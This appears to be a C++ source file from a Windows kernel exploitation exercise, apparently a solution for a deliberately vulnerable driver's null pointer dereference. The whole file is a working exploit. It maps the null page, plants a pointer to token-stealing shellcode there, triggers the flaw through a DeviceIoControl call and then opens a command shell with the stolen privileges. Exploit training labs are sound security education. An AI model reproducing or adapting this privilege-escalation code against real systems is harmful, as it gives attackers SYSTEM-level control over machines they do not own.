#include <Windows.h>
#include "stdio.h"

#include "Solutions.h"
#include "ioctal_codes.h"
#include "TokenStealingShellcode.h"
#include "utils.h"

typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(
		IN HANDLE ProcessHandle,
		IN OUT PVOID* BaseAddress,
		IN ULONG_PTR ZeroBits,
		IN OUT PSIZE_T RegionSize,
		IN ULONG AllocationType,
		IN ULONG Protect
	);

NTSTATUS Solutions::TriggerNullPointerDereference() {
	LPVOID lpInBuffer = NULL;
	DWORD dwLen = 8;
	DWORD dwBytesReturned = 0;

	AllocateNullPage(0x1000);

	// we just allocated it :)
	const char* buf = 0;

	wprintf(L"[+] Allocated Null Page");
	*(PULONG)(buf + 4) = (ULONG)(&tokenStealingShellcodeWriteWhatWhere);

	lpInBuffer = (LPVOID)"AAAAAAAA";

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_NULL_POINTER_DEREFERENCE,
		lpInBuffer, dwLen, NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not talk with the driver\n");
		return 1;
	}

	wprintf(L"[+] Succsfully talked with the driver\n");

	system("cmd.exe");
}